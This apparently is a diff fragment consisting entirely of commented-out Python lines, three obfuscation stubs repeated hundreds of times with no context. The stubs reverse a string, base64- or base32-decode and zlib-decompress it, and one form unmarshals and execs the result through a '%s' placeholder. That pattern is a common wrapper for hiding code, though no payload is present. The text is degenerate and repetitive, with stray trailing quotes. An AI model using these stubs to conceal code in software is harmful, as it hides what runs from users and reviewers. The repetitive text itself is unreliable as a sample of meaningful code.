+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
